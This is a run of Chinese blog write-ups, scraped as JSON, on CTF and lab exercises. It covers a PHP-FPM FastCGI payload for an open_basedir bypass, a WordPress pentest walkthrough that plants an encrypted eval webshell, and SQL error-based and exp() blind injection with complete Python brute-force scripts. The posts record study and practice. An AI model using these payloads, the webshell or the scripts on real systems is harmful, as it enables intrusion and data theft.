0Aallow_url_include+%3D+On%0Aopen_basedir+%3D+%2F%0Aauto_prepend_file+%3D+%0F%0DSERVER_SOFTWARE80sec%2Fwofeiwo%0B%09REMOTE_ADDR127.0.0.1%0B%04REMOTE_PORT9001%0B%09SERV ER_ADDR127.0.0.1%0B%02SERVER_PORT80%0B%09SERVER_NAMElocalhost%0F%08SERVER_PROTOCOLHTTP%2F1.1%0E%02CONTENT_LENGTH49%01%04%00%01%00%00%00%00%01%05%00%01%001%00%00%3C%3Fphp+system%28%24_REQUEST%5B%27command%27%5D%29%3B+phpinfo%28%29%3B+%3F%3E%01%05%00%01%00%00%00%00 将上述内容发送后即可成功反弹shell 读取的时候发现权限不够，这里需要提权，至于原理一会儿讨论 利用suid提权方式，查看具有suid权限的文件，这个要等一会才能出来。 find / -perm -u=s -type f 2&gt;/dev/null 这里看到有PHP权限，直接php -a进入交互模式读取，但这里如果直接读取flag的话还是有open_basedir的限制，因此还需要利用上述的方法绕过，这里写文件比较方便，但我就直接输入了。 mkdir('gyy');chdir('gyy');ini_set('open_basedir','..');chdir('..');chdir('..');chdir('..');chdir('..');chdir('..');chdir('..');chdir('..');ini_set('open_basedir','/');var_dump(file_get_contents(\"/flag\")); 蚁剑插件绕过 这里看到有个wp说利用蚁剑的插件可以直接梭哈了，学一波，大概就是修改一下蚁剑的插件，省去vps打脚本的过程。蚁剑里有通过攻击 PHP-FPM 绕过 Disable_Functions 的插件，自行去商店下载即可 但是这里需要对插件进行修改 插件中的payload使用了fsockopen()，但是fsockopen()被ban了，并且并且蚁剑的插件中没有 PHP-FPM 地址为 127.0.0.1:9001 的选项。但是pfsockopen()没有被ban 而且两者没有任何区别，将这两个文件下的fsockopen()改成pfsockopen() 但是没玩懂，跟着做也不行，感兴趣的自己参考文章吧：[2021 蓝帽杯]one_Pointer_php 复现 0x05 总结 这里在回顾整理上述攻击的思路：首先就是对于PHP数组的溢出绕过，之后发现可以写木马了，蚁剑连接发现权限不够，因此要想着拿shell，去进一步的提权，接着发现了open_basedir的限制以及FastCGI服务开启了。 于是我们想着绕过open_basedir来读取FastCGI相关配置信息（因为file_put_contents函数没有禁用，完全可以通过这个函数来ssrf+ftp来打），最后成功读取到了开启的端口为9001，但我们如何才能反弹shell呢，这时候我们又看到了一个拓展extension，这里竟然允许加载.so文件，那我们就能构造恶意的.so文件来拿shell。 但目前为止我们只能在html目录下读写，且没有执行权限，那如何让靶机执行我们的.so文件呢，这时候就想到ftp的作用了。首先我们构造FastCGI的请求PHP-CGI，通过对其中的某些信息的修改（修改为9001端口，这里用于让靶机自己访问自己的9001端口，然后在其中还要写明待加载的恶意.so文件目录以及覆盖open_basedir为根目录）。 这里就相当于我们写的FastCGI协议的内容就是恶意代码，之后我们开启了ftp服务，并且让靶机访问了我们的ftp服务，访问之后我们的ftp服务器会让靶机读取我们指定的ip和端口（127.0.0.1和9001），这样的话他实际上就是去读取或写入到自己服务器上9001的内容，同时我们发送上述得到的FastCGI协议的恶意代码，这段代码在file_put_contents函数的作用下就传到了端口9001中，也就是fpm接受到了一个二进制数据流，随后该fpm就会执行这段数据，我们的恶意代码也就成功被执行，拿到shell 在学了上述知识，接下来还有一些不懂得点，open_basedir的绕过需要总结一手，suid提权复习一手，extension=xx.so不太懂，ret=127不理解，接下来就再写一篇文章来解决！！！ 0x06 参考文章 ubuntu下nginx+PHP-FPM安装 Fastcgi协议分析 &amp;&amp; PHP-FPM未授权访问漏洞 &amp;&amp; Exp编写 Fastcgi 协议分析与 PHP-FPM 攻击方法 SSRF系列之攻击FastCGI 利用SSRF攻击内网FastCGI协议 陇原战“疫“2021网络安全大赛 Web eaaasyphp 陇原战疫2021网络安全大赛 wooyun-2014-071540 PHP绕过open_basedir列目录的研究 蓝帽杯One_Pointer_PHP复现总结 蓝帽杯2021 One Pointer PHP 蓝帽杯2021一道题——One_Pointer_PHP 从PHP底层看open_basedir bypass","tags":["基本知识"],"categories":["web知识总结"]},{"title":"常见渗透测试流程","path":"/2023/12/19/chang-jian-shen-tou-ce-shi-liu-cheng/","content":"0x01 前言 最近刷公众号看到一位师傅发了个基本的渗透测试流程，我感觉刚好有利于我这个小白学习一波，毕竟之前虽然刷了几个简单靶场，但对于测试流程还是很模糊，借此文章来浅浅学习一下，让自己以后刷靶场也不至于特别盲目。 0x02 信息搜集 将虚拟机的网络设置为NAT与主机共享地址。保证和kali处于同一网段。我们启动靶机，接着第一步获取目标ip地址 2.1 获取IP地址 现在我们需要知道目标主机的IP地址。我们在kali中用netdiscover工具扫描即可。 netdiscover -i eth0 -r 192.168.246.1/24 这里呢我们的kali地址为192.168.246.254，那很明显就是第三个192.168.246.136了，接着我们进行端口扫描 2.2 端口扫描 在上一步中我们获取了靶机地址，那接下来就应该看靶机开启了那些端口可以让我们进行进一步利用 nmap -T4 -A 192.168.246.136 部分参数解释： -T&lt;0-5&gt;: 调整扫描速度，0-5 6个级别，经常使用4 -A：一次扫描包含系统探测、版本探测、脚本扫描和跟踪扫描 --也就是扫描的很全面 由上图我们看到靶机地址开启的端口有： 22、80、139、445、3306、6667 开启了ssh、http、文件共享（可能）、MySQL服务等 当然这里信息搜集肯定不止这些，但这个靶机简单，也就这么多就行。后续肯定会学到更多 0x03 渗透测试 3.1 对Web站点测试 我们访问一手靶机IP地址，如下图是一个Web站点 扫描站点目录，看是否存在敏感文件 dirsearch -u \"http://192.168.246.136/\" #或者一般会采用多个命令来扫描目录，可以配合如下命令 dirb http://192.168.246.136/ 如上图，我们可以看到敏感目录还是很多的：info.php、phpmyadmin、wp等 这里看那位师傅看到是wp程序，直接采用了wpscan神器 wpscan --url http://192.168.246.136/ 但遗憾的是没有结果，看了文章发现tm命令错了，我以为他直接就能识别到wordpress的，想不到还得手动加一下 wpscan --url http://192.168.246.136/wordpress 这里可以发现一些关于wp程序的信息，但并没有什么有价值的信息，这里说是有wpscan的api的话，可以扫出漏洞，但我去注册遇到了问题就先不设置了。工具的具体用法参考如下： 针对博客网站的扫描神器Wpscan入门使用指南 wpscan使用教程 3.2 Samba服务 在刚才的扫描中，目标开启了445端口，这意味着可能存在文件共享服务。我们可以利用enum4linux枚举运行Samba的主机。命令如下： enum4linux 192.168.246.136 这个工具的具体用法可参考： Kali Linux信息收集之enum4linux Kali 信息收集之enum4linux 使用教程 这里说一下该工具的主要功能，可检测如下信息： RID循环（当Windows 2000上的RestrictAnonymous设置为1时） 用户列表（当Windows 2000上的RestrictAnonymous设置为0时） 组成员信息列表 共享枚举 检测主机是否在工作组或域中 识别远程操作系统 密码策略检索（使用polenum） 翻看了一下发现这里用户名和密码是空的，还有下图的一些SID，但不清楚作用 这里那位师傅直接就挂载目录到本地了，这里我认为是由于靶机开启了文件共享服务，那我们完全可以主动连接对方，并选择挂载相应的目录到本地。–由于靶机的用户名和密码是空的，我们完全可以任意连接 mount -t cifs -o username=’’,password=’’ //192.168.246.136/share$ /mnt 挂载windows共享目录 #挂载的时候要加上-t参数指定类型，所以必须使用root用户挂载，如果挂载后普通用户需要写入，需要指定file_mode=0777,dir_mode=0777，否则只有root用户可以写入，普通用户只读。 root@vanfonuat:/# mount -t cifs -o user=everyone,file_mode=0777,dir_mode=0777 //192.168.0.8/SHARE /sharedata Password for everyone@//192.168.0.8/SHARE: 但这里疑惑的是他如何判断出对方是windows系统的，这里找了几个文章，感觉是一般有工作组、域环境的都是windows系统，或者是上述信息中已经可以证实，但我并未看出来。 mount命令参考：Linux命令之mount命令 这里在输入命令的时候还踩坑了，我发现一直报错 仔细比对命令发现，那位师傅的命令中的引号是中文的。。。。实在是不理解，真奇怪 mount -t cifs -o username=’’,password=’’ //192.168.123.206/share$ /mnt #正确 mount -t cifs -o username='',password='' //192.168.123.206/share$ /mnt #报错 现在我们得到了这些文件，仔细分析了文件名会发现，我们挂载的目录似乎就是当前的web站点下。 3.3 柳暗花明又一村 通过对前面web站点的扫描，我们并没有得到有用的信息。但是通过smb服务，我们发现目标直接挂载到了站点目录。通过对站点目录的读取，我们顺利得到了数据库的配置文件。 我们可以在wp-config.php文件中读取到数据库用户名和密码的信息，接下来去phpmyadmin尝试登录 成功登录，但当想进一步查询数据库的时候发现权限不够。。。 随后那位师傅猜测，这个账号也可以登录wp后台，我们尝试一下 成功登录，接下来的步骤我就完全不知道了，跟着走一遍吧： 接下来，我们在wp后台，点击编辑404模板。写入一句话。 &lt;?php @error_reporting(0); session_start(); $key=\"e45e329feb5d925b\"; $_SESSION['k']=$key; session_write_close(); $post=file_get_contents(\"php://input\"); if(!extension_loaded('openssl')) { $t=\"base64_\".\"decode\"; $post=$t($post.\"\"); for($i=0;$i&lt;strlen($post);$i++) { $post[$i] = $post[$i]^$key[$i+1&amp;15]; } } else { $post=openssl_decrypt($post, \"AES128\", $key); } $arr=explode('|',$post); $func=$arr[0]; $params=$arr[1]; class C{public function __invoke($p) {eval($p.\"\");}} @call_user_func(new C(),$params); ?&gt; 但这里不知道为何一直连接不上，暂且当个思路吧，搞了半天弄不出来。。。。 0x04 参考文章 浅谈常见渗透测试流程 冰蝎(Behinder)下载与安装以及连接测试","tags":["红队渗透"],"categories":["内网渗透"]},{"title":"再探SQL报错注入","path":"/2023/12/14/zai-tan-sql-bao-cuo-zhu-ru/","content":"0x01 前言 本文的产生是由于刚刚刷PentesterLab靶场遇到的SQL注入问题，发现自己对SQL报错注入还是有一定的欠缺，故此来复习一波。 0x02 rand和order by报错注入 一般意义上来说，我们常用的显错注入手段是这两个，在mysql的官方文档中有这样一句 RAND() in a WHERE clause is re-evaluated every time the WHERE is executed.You cannot use a column with RAND() values in an ORDER BY clause, because ORDER BY would evaluate the column multiple times. 译文： 每次执行 WHERE 时，都会重新计算 WHERE 子句中的 RAND()。不能在 ORDER BY 子句中使用带有 RAND() 值的列，因为 ORDER BY 会多次计算该列。 也就是说不能作为order by的条件字段，group by同理，所以有如下payload： and+1=2+UNION+SELECT+1+FROM+(select+count(*),concat(floor(rand(0)*2),(select+concat(0x5f,database(),0x5f,user(),0x5f,version())))a+from+information_schema.tables+group+by+a)b-- 其中a为: concat(floor(rand(0)*2),(select+concat(0x5f,database(),0x5f,user(),0x5f,version()))) 后面又group by a，所以会爆出 Duplicate entry ‘XXXXXXXXXX’ for key ‘group_key’ 译文： 密钥“group_key”的条目“XXXXXXXXXX”重复 其中XXXXX就是0x5f,database(),0x5f,user(),0x5f,version()的内容，这样一步步就能拿到想要的信息 在前面的payload中其实还有个很重要的函数是floor()取整，在之前的文章中研究过，floor(rand(0)*2)这样会产生重复的随机数，从而在order by时候报错。 接下来详细分析一波上述payload的原理： Floor（）函数 floor（），rand（），count（），group by联合使用： floor（）：向下取整 rand（）：生成一个0-1之间的随机数，不包括0和1 count（*）：统计某个表下面一共有多少记录 group by XXX：按照一定的规则对XXX进行排序 报错原理：group by和rand（）联合使用的时候，如果临时表中没有该主键，则再插入的之前会再计算一次rand（），然后再由group by将计算出来的主键直接插入到临时表格之中，导致主键重复，然后报错。 上述是这些函数的简单用法，以下不想费劲搭环境了，直接照搬师傅的了。。。 在这里使用group by的时候回生成一张临时表，也叫做虚拟表，而且表都是有主键的，作为主键的列是不能由重复的，好比第一个值的主键为1，那么就不能再有主键为1的值了，接下来可以再是2、3… 可以看到上述两幅图片中第二幅图片的序列明显更规律（也就是伪序列） 首先这是一个虚拟表，自然就有主键。当使用group by去读这些数据的时候，好比上面这个伪随机序列，读完第一列，发现主键之中没有0这个数字，但由于rand的存在，他不会立刻插入，而是会继续运算一次rand函数，然后经过floor之后0变成了1，随后率先插入的数字便成了1。然后取第二条数据，此时floor之后为数字1，但该虚拟表中已经有了1，则该数字1对应的值自增1，继续从from的表中取第三条记录，再次计算floor(rand(0)*2)，结果为0，由于表中不存在数字0，则继续rand一次，经过floor之后成了1，但根据特性，该数字1会硬插入该虚拟表中，导致了数字1的重复，最终报错 这里是个例子，将user（）的位置换做别的，就可以显示出别的错误了。 爆库： 可以看到使用的security，后面的数字1是rand（）函数产生的。 这里可以看到具体信息了。其实就是利用了count的统计与group by的合作，然后基于主键唯一的机制，然后造成了这个错误。 模板payload大致如下： ?id=1 and 1=2 UNION SELECT 1 FROM (select count(*),concat(floor(rand(0)*2),(select concat(0x5f,database(),0x5f,user(),0x5f,version())))a from information_schema.tables group by a)b; #第一种 ?id=1' and (select 1 from(select count(*),concat(floor(rand(0)*2),(select concat(username,0x7e,password)from users limit 0,1))a from information_schema.tables group by a)b)--+ #第二种 ?id=1' and (select 1 from(select count(*),concat(floor(rand(0)*2),(select user()))a from information_schema.tables group by a)b)--+ #第二种 ?id=1' and (select 1 from(select count(*),concat(floor(rand(0)*2),(select user()))x from information_schema.tables group by x)b)--+ uname=hybcx&amp;passwd=1' union select count(*),concat((select concat(username,0x7e,password)from users),floor(rand(0)*2))x from information_schema.columns group by x#&amp;submit=Submit #第三种 只需将上面模板中的内容替换成为我们的查询payload即可，a与b均是字段别名 0x03 EXP函数报错注入 作用：计算以e为底的幂值 语法：exp（X） 报错原理：当参数X超过了710之后，exp函数就会报错。 MySQL中的EXP()函数用于将E提升为指定数字X的幂，这里E(2.718281 …)是自然对数的底数。 该函数可以用来进行 MySQL 报错注入。但是为什么会报错呢？我们知道，次方到后边每增加 1，其结果都将跨度极大，而 MySQL 能记录的 Double 数值范围有限，一旦结果超过范围，则该函数报错。这个范围的极限是 709，当传递一个大于 709 的值时，函数 exp() 就会引起一个溢出错误： 除了 exp() 之外，还有类似 pow() 之类的相似函数同样是可利用的，他们的原理相同。 使用版本：MySQL5.5.5 及以上版本 现在我们已经知道当传递一个大于 709 的值时，函数 exp() 就会引起一个溢出错误。那么我们在实际利用中如何让 exp() 报错的同时返回我们想要得到的数据呢？ 我们可以用 ~ 运算符按位取反的方式得到一个最大值，该运算符也可以处理一个字符串，经过其处理的字符串会变成大一个很大整数足以超过 MySQL 的 Double 数组范围，从而报错输出： 如上图所示，成功报错并输出了数据。但是事实证明，在 MySQL&gt;=5.5.53 之后，exp() 报错不能返回我们的查询结果，而只会得到一个报错： 下面由于实操的时候在安装MySQL低版本总是报错，我就直接照搬了（见谅~） 注出数据 得到表名： mysql&gt; select exp(~(select * from(select group_concat(table_name) from information_schema.tables where table_schema=database())x)); ERROR 1690 (22003): DOUBLE value is out of range in 'exp(~((select 'flag,users' from dual)))' 得到列名： mysql&gt; select exp(~(select*from(select group_concat(column_name) from information_schema.columns where table_name='users')x)); ERROR 1690 (22003): DOUBLE value is out of range in 'exp(~((select 'id,username,password' from dual)))' 检索数据： mysql&gt; select exp(~ (select*from(select group_concat(id, 0x7c, username, 0x7c, password) from users)x)); ERROR 1690 (22003): DOUBLE value is out of range in 'exp(~((select '1|admin|123456,2|whoami|657260,3|bunny|864379' from dual)))' 读取文件（有13行的限制）： mysql&gt; select exp(~(select * from(select load_file('/etc/passwd'))x)); ERROR 1690 (22003): DOUBLE value is out of range in 'exp(~((select 'root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin' from dual)))' 这个查询可以从当前的上下文中 dump 出所有的 tables 与 columns，我们也可以 dump 出所有的数据库，但由于我们是通过报错来获取，因此它返回的结果有限： mysql&gt; select exp(~(select*from(select(concat(@:=0,(select count(*)from`information_schema`.columns where table_schema=database()and@:=concat(@,0xa,table_schema,0x3a3a,table_name,0x3a3a,column_name)),@)))x)); ERROR 1690 (22003): DOUBLE value is out of range in 'exp(~((select '000 ctf::flag::id ctf::flag::flag ctf::users::id ctf::users::username ctf::users::password' from dual)))' 那对于这个payload我有所疑惑，因此我询问了GPT（其中的@符号的作用） select exp(~(select*from(select(concat(@:=0,(select count(*)from information_schema.columns where table_schema=database()and@:=concat(@,0xa,table_schema,0x3a3a,table_name,0x3a3a,column_name)),@)))x)); 在这个 SQL 查询语句中： @:=concat(@,0xa,table_schema,0x3a3a,table_name,0x3a3a,column_name) @ 是一个用户变量，用于存储中间结果。在这里，@ 的作用是在不同的步骤中保留中间拼接的字符串。 让我解释一下： @:=0：这是一个初始化步骤，将用户变量 @ 设置为零。 @:=concat(@,0xa,table_schema,0x3a3a,table_name,0x3a3a,column_name)：在这一步，concat 函数用于将当前的 @ 值与新的字符串拼接，然后将结果再次存储在 @ 变量中。这样，@ 变量逐渐被构建起来，包含了多次拼接的结果。 实际上，这两个 @ 符号是同一个用户变量，只是在不同的时刻被使用。第一个 @ 是在初始化时使用，而后续的 @ 是在拼接字符串时使用，用于保留中间结果。 Insert位置注入 根据 Insert 位置的注入方式按部就班就好了。假设原来的插入语句如下： insert into users(id,username,password) values(4,'john','679237'); 我们可以在 username 或 password 位置插入恶意的 exp() 语句进行报错注入，如下所示： # 在username处插入: john' or exp(~(select * from(select user())x)),1);#, 则sql语句为: insert into users(id,username,password) values(4,'john' or exp(~(select * from(select user())x)),1);#','679237'); mysql&gt; insert into users(id,username,password) values(4,'john' or exp(~(select * from(select user())x)),1);#','679237');; ERROR 1690 (22003): DOUBLE value is out of range in 'exp(~((select 'root@localhost' from dual)))' 爆出所有数据： # 在username处插入: john' or exp(~(select*from(select(concat(@:=0,(select count(*)from`information_schema`.columns where table_schema=database()and@:=concat(@,0xa,table_schema,0x3a3a,table_name,0x3a3a,column_name)),@)))x)),1);# mysql&gt; insert into users(id,username,password) values(4,'john' or exp(~(select*from(select(concat(@:=0,(select count(*)from`information_schema`.columns where table_schema=database()and@:=concat(@,0xa,table_schema,0x3a3a,table_name,0x3a3a,column_name)),@)))x)),1);#','679237'); ERROR 1690 (22003): DOUBLE value is out of range in 'exp(~((select '000 ctf::flag::id ctf::flag::flag ctf::users::id ctf::users::username ctf::users::password' from dual)))' Update位置注入 根据 Update 位置的注入方式按部就班就好了。假设原来的插入语句如下： update users set password='new_value' WHERE username = 'admin'; 我们可以在 new_value 或后面的 where 子句处插入恶意的 exp() 语句进行报错注入，如下所示： # 在new_value处插入: abc' or exp(~(select * from(select user())x))#, 则sql语句为: update users set password='abc' or exp(~(select * from(select user())x))# WHERE username = 'admin'; mysql&gt; update users set password='abc' or exp(~(select * from(select user())x));# WHERE username = 'admin'; ERROR 1690 (22003): DOUBLE value is out of range in 'exp(~((select 'root@localhost' from dual)))' exp() 函数进行盲注 有的登录逻辑会根据 sql 语句的报错与否返回不同的结果，如果我们可以控制这里得报错的话便可以进行盲注。下面我们通过一个 CTF 例题来进行详细探究。 2021 虎符杯 CTF Finalweb Hatenum 进入题目是一个登录页面：（对我来说有点难度，只能基本抄wp了） 我们先分析一波题目给的源码 home.php &lt;?php require_once('config.php'); if(!$_SESSION['username']){ header('location:index.php'); } if($_SESSION['username']=='admin'){ echo file_get_contents('/flag'); } else{ echo 'hello '.$_SESSION['username']; } ?&gt; 这里说如果我们存储在session变量中的username=admin的话就给flag config.php &lt;?php error_reporting(0); session_start(); class User{ //数据库配置信息 public $host = \"localhost\"; public $user = \"root\"; public $pass = \"123456\"; public $database = \"ctf\"; public $conn; function __construct(){ //进行数据库连接 $this-&gt;conn = new mysqli($this-&gt;host,$this-&gt;user,$this-&gt;pass,$this-&gt;database); if(mysqli_connect_errno()){ die('connect error'); } } //查询用户输入的用户名是否在数据库中 function find($username){ $res = $this-&gt;conn-&gt;query(\"select * from users where username='$username'\"); if($res-&gt;num_rows&gt;0){ return True; } else{ return False; } } //注册功能部分 function register($username,$password,$code){ if($this-&gt;conn-&gt;query(\"insert into users (username,password,code) values ('$username','$password','$code')\")){ return True; } else{ return False; } } //如果查询到对应用户名，则成功登录 function login($username,$password,$code){ $res = $this-&gt;conn-&gt;query(\"select * from users where username='$username' and password='$password'\"); if($this-&gt;conn-&gt;error){ return 'error'; } else{ $content = $res-&gt;fetch_array(); if($content['code']===$_POST['code']){ $_SESSION['username'] = $content['username']; return 'success'; } else{ return 'fail'; } } } } //进行了很有力的过滤，不过没有过滤\\与() function sql_waf($str){ if(preg_match('/union|select|or|and|\\'|\"|sleep|benchmark|regexp|repeat|get_lock|count|=|&gt;|&lt;| |\\*|,|;|\\r| |\\t|substr|right|left|mid/i', $str)){ die('Hack detected'); } } function num_waf($str){ if(preg_match('/\\d{9}|0x[0-9a-f]{9}/i',$str)){ die('Huge num detected'); } } function array_waf($arr){ foreach ($arr as $key =&gt; $value) { if(is_array($value)){ array_waf($value); } else{ sql_waf($value); num_waf($value); } } } 那我们重点关注一下sql语句部分 $res = $this-&gt;conn-&gt;query(\"select * from users where username='$username' and password='$password'\"); 这里似乎可以构造万能密码，payload似乎与我之前刷的靶场思路一致 username=\\ password=||1# select * from users where username='(\\' and password=')||1#' 括号内就是username的值，这样的话可以成功绕过 但这里有一个验证码code无从得知，只能看wp了 所以我们的思路是使用 rlike（即regexp）按照之前regexp匹配注入的方法，将 code 匹配出来。我们又在 login 函数中注意到： 当使用正则匹配时，使用REGEXP和NOT REGEXP操作符(或RLIKE和NOT RLIKE，功能是一样的) LIKE要全部匹配才返回1，而RLIKE和REGEXP则是部分匹配即可返回1。 mysql&gt; select 'abcd' like 'a'; +-----------------+ | 'abcd' like 'a' | +-----------------+ | 0 | +-----------------+ 1 row in set (0.04 sec) mysql&gt; select 'abcd' rlike 'a'; +------------------+ | 'abcd' rlike 'a' | +------------------+ | 1 | +------------------+ 1 row in set (0.03 sec) mysql&gt; select 'abcd' regexp 'a'; +-------------------+ | 'abcd' regexp 'a' | +-------------------+ | 1 | +-------------------+ 1 row in set (0.04 sec) （好好好，又得学习一波regexp注入了~~~~） if($this-&gt;conn-&gt;error){ // 如果sql语句报错就返回error return 'error'; } 如果 sql 语句出现错误便返回字符串 “error”，然后进入到 login.php 中就会返回 error。根据这里的特性，如果我们可以控制这里的报错的话，便可以进行盲注。 但是怎么构造呢？在网上的看到了大佬的思路是真的巧妙： ||exp(710-(... rlike ...)) 即如果 (... rlike ...) 中的语句执行匹配后的结果为True，经过减号转换后为 exp(710-1) 后不会溢出；若为false，转换为 exp(710-0) 后则会溢出并报错。 大致的 payload 如下： 'username': 'admin\\', 'password': '||exp(710-(code rlike binary {0}))#', 'code': '1' 对于上述payload的解释（GPT）： select (select database()) regexp binary '^sec' 例子如上，解释如下，大概binary关键字就是用来区分大小写的吧 这段 SQL 语句可以分为两部分，让我一步一步解释： 1. `(select database())`：这部分执行一个子查询，获取当前数据库的名称。 2. `regexp binary '^sec'`：这部分使用正则表达式进行匹配，并且使用 `binary` 进行二进制比较。 - `regexp` 是 MySQL 中用于执行正则表达式匹配的操作符。 - `binary` 是一个修饰符，用于表示要进行二进制比较。在这个上下文中，它确保正则表达式的匹配是对字节进行精确匹配，而不考虑字符的大小写或编码。 - `'^sec'` 是一个正则表达式模式，表示以 \"sec\" 开头的字符串。 综合起来，整个 SQL 语句的含义是：检查当前数据库的名称是否以 \"sec\" 开头。如果匹配成功，查询将返回 1，表示真（true）；否则，返回 0，表示假（false）。 但这里题目过滤了引号，所以我们rlike无法直接引入%和^。按照之前的regexp注入操作我们可以将^连同后面的待猜测字符一块做Hex编码，之后进入数据库中MySQL会自动将16进制编码的字符转为对应的字符串 def str2hex(string): # 转换16进制,16进制在数据库执行查询时又默认转换成字符串 result = '' for i in string: result += hex(ord(i)) result = result.replace('0x', '') return '0x' + result ...... passwd = str2hex('^' + name + j) payloads = payload.format(passwd).replace(' ',chr(0x0c)) postdata = { 'username': 'admin\\\\', 'password': payloads, 'code': '1' } 题目还限制了 password 位置匹配的字符串长度，最长只能匹配 4 个字符，如果超过了 4 个则会返回 Huge num detected 错误（但我不知道为何师傅们都说最多只能4个字符，我看着正则当中是数字9，不应该是9个字符吗。。不理解）。 接着我幸运地找到了一个解释： 同时num_waf 有个判断十六进制位数不能超过9位，既字符串不能超过4位(一个字母对应2个十六进制数)，所以在包含正则^以外的字符串超过3位时需要不断做替换，用3位字符串去匹配下一位 那这样的话我们便不能在 payload 里面使用 ^ 了，也就没有办法在正则表达式中确定首位的位置，我们只能知道有这么几个连续的字符，就像下面这样： mysql&gt; select 'flag{abcdefghijklmnopqrstuvwxyz}' rlike 'ab'; +-----------------------------------------------+ | 'flag{abcdefghijklmnopqrstuvwxyz}' rlike 'ab' | +-----------------------------------------------+ | 1 | +-----------------------------------------------+ 1 row in set (0.04 sec) mysql&gt; select 'flag{abcdefghijklmnopqrstuvwxyz}' rlike 'lag{'; +-------------------------------------------------+ | 'flag{abcdefghijklmnopqrstuvwxyz}' rlike 'lag{' | +-------------------------------------------------+ | 1 | +-------------------------------------------------+ 1 row in set (0.03 sec) 师傅的爆破思路：先爆破出前三位来，然后再通过前 3 位爆第4位，再通过第2、3、4位爆第5位… 编写如下脚本进行爆破： import requests import string def str2hex(string): # 转换16进制,16进制在数据库执行查询时又默认转换成字符串 result = '' for i in string: result += hex(ord(i)) result = result.replace('0x', '') return '0x' + result strs = string.ascii_letters + string.digits + '_' url = \"http://690399e6-ab28-459d-ab40-789da08843fb.node4.buuoj.cn:81/login.php\" headers = { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0' } payload = '||exp(710-(code rlike binary {0}))#' if __name__ == \"__main__\": name = '' z = 3 for i in range(1, 40): for j in strs: passwd = str2hex(name + j) payloads = payload.format(passwd).replace(' ',chr(0x0c))#0x0c代替空格 postdata = { 'username': 'admin\\\\', 'password': payloads, 'code': '1' } r = requests.post(url, data=postdata, headers=headers, allow_redirects=False) #print(r.text) if \"fail\" in r.text: name += j print(j, end='') break if len(name) &gt;= 3: for i in range(1, 40): for j in strs: passwd = str2hex(name[z - 3:z] + j) # ergh payloads = payload.format(passwd).replace(' ', chr(0x0c)) postdata = { 'username': 'admin\\\\', 'password': payloads, 'code': '1' } r = requests.post(url, data=postdata, headers=headers, allow_redirects=False) # print(r.text) if \"fail\" in r.text: name += j print(j, end='') z += 1 break 出结果了，别高兴的太早，因为这里陷入了一个死循环当中： erghruigh2uygh2uygh2uygh2uygh2uygh2uygh2uygh2uygh2uygh2uygh...... 可以看到爆出 erghruigh2 之后不停地循环出现 uygh2，所以我们可以推测出真正的 code 里面有两个 gh2，其中位于前面的那个 gh2 后面紧跟着一个 u，即 gh2u。后面那个 gh2 后面跟的是那个字符我们还不能确定，那我们便可以测试一下除了 u 以外的其他字符，经测试第二个 gh2 后面跟的字符是 3，即 gh23，然后继续根据 h23 爆破接下来的字符就行了，最后得到的 code 如下： erghruigh2uygh23uiu32ig 不过这里我也是想不通最后这个死循环的解决原理。。。 然后直接登陆即可得到 flag： 接着我又找了几篇wp发现有位师傅直接从最后一个字符开始匹配，用到了$正则： $ 是一个用于锚定模式结尾位置的元字符，用于确保匹配发生在输入字符串的末尾。 这样就不会有上述重复的问题，但是也要配合从第一位开始爆破的脚本，这样两者对比才可正确得出 import requests import string def str2hex(string): # 转换16进制,16进制在数据库执行查询时又默认转换成字符串 result = '' for i in string: result += hex(ord(i)) result = result.replace('0x', '') return '0x' + result strs = string.ascii_letters + string.digits + '_' url = \"http://690399e6-ab28-459d-ab40-789da08843fb.node4.buuoj.cn:81/login.php\" headers = { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0' } payload = '||exp(710-(code rlike binary {0}))#' tmp = '$' if __name__ == \"__main__\": name = '' z = 3 for i in range(1, 40): for j in strs: passwd = str2hex(j + tmp) payloads = payload.format(passwd).replace(' ',chr(0x0c)) postdata = { 'username': 'admin\\\\', 'password': payloads, 'code': '1' } r = requests.post(url, data=postdata, headers=headers, allow_redirects=False) #print(r.text) if \"fail\" in r.text: name += j print(j + tmp, name) if len(tmp) == 3: tmp = j + tmp[:-1] else: tmp = j + tmp break 如上图，最后简单反转一下字符串即可 最后会有如下： erghruigh2uygh2uygh2uygh2uygh2 erghruigh23uiu32ig 我们两者对比得到erghruigh2uygh23uiu32ig 只能说脚本对我来说好难。。。接下来就是跟着编写脚本的时候了 import requests import string def str2hex(str): result = '' for i in str: result += hex(ord(i)) result = result.replace('0x', '') return '0x' + result strs = string.ascii_letters + string.digits + '_' url = 'http://690399e6-ab28-459d-ab40-789da08843fb.node4.buuoj.cn:81/login.php' headers = { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0' } payload = '||exp(710-(code rlike binary {0}))#' tmp = '^' name = '' for i in range(1, 40): for j in strs: passwd = str2hex(tmp + j) payloads = payload.format(passwd).replace(' ', chr(0x0c)) data = { 'username': '\\\\', 'password': payloads, 'code': '1' } req = requests.post(url, data = data, allow_redirects=False) if 'fail' in req.text: name += j print(tmp + j, name) if len(tmp) == 3: tmp = tmp[1:] + j else: tmp += j break tmp = '$' name = '' for i in range(1, 40): for j in strs: passwd = str2hex(j + tmp) payloads = payload.format(passwd).replace(' ', chr(0x0c)) data = { 'username': '\\\\', 'password': payloads, 'code': '1' } req = requests.post(url, data = data, allow_redirects=False) if 'fail' in req.text: name = j + name print(j + tmp, name) if len(tmp) == 3: tmp = j + tmp[:-1] else: tmp = j + tmp break data = { 'username': '\\\\', 'password': '||1#', 'code': 'erghruigh2uygh23uiu32ig' } req = requests.post(url, data=data) print(req.text) 